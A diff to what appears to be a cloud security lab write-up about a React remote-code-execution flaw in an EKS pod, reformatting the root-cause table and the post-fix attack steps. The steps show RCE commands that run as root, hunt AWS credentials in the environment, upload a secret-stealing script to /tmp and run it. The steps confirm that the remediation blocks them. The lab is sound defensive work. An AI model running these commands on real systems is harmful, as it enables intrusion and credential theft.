@@ -48,14 +48,10 @@
 
 ### Root cause analysis
 
-- Issues:
-  - EKS pod is granted access to secretmanager
-  - AWS context get injected into the pod
-- Root cause
-  - broad IRSA `*/*`
-  - pod annotation with aws role
-- Fix
-  - Remove `pod-irsa` role
+| Issue                             | Root cause       | fix                           |
+| --------------------------------- | ---------------- | ----------------------------- |
+| EKS role can access SecretManager | Broad IRSA `*/*` | Remove `pod-irsa` role        |
+| AWS contexts get injected in pod  | pod annotation   | Remove annotation of iam role |
 
 ---
 
@@ -91,11 +87,11 @@ kubectl rollout restart deploy/react2shell -n react
 # ##############################
 # Attack
 # ##############################
-# 1. confirm RCE by id — app still vulnerable (code/container/cluster unhardened)
+# 1. confirm RCE by id: app still vulnerable (code/container/cluster unhardened)
 python scripts/rce.py $VICTIM_URL "id"
 # uid=0(root) gid=0(root) groups=0(root)
 
-# 2. look for an AWS identity — none projected (annotation removed, role gone)
+# 2. look for an AWS identity: none projected (annotation removed, role gone)
 python scripts/rce.py $VICTIM_URL "env | grep AWS"
 # no output
 # no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE
@@ -104,7 +100,7 @@ python scripts/rce.py $VICTIM_URL "env | grep AWS"
 b64=$(base64 -w0 scripts/steal_secret.js)
 python3 scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"
 
-# 4. try to grab the jewel — no credentials to assume any role
+# 4. try to grab the jewel: no credentials to assume any role
 python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
 # no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
 ```
